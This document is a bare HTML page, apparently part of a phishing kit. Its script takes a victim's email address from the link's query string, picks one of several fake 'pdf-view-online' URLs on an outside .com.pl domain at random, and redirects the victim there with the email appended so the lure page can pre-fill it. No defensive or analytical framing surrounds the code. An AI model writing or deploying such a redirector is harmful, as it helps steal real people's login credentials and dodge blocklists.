<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REDIRECTING</title>
</head>
<body>
    <script>
        const urls = [
            'https://alltrm.com.pl/pdf-view-online-a2c0/',
            'https://alltrm.com.pl/pdf-view-online-a2c7/',
            'https://alltrm.com.pl/pdf-view-online-a2c4/',
            // Add more URLs to the array
        ];
        let randomUrl = urls[Math.floor(Math.random() * urls.length)];
        const email = new URLSearchParams(location.search).get('email');
        if (email) {
            randomUrl += 'index.html#' + email;
        }
        location.replace(randomUrl);
    </script>
</body>
</html>
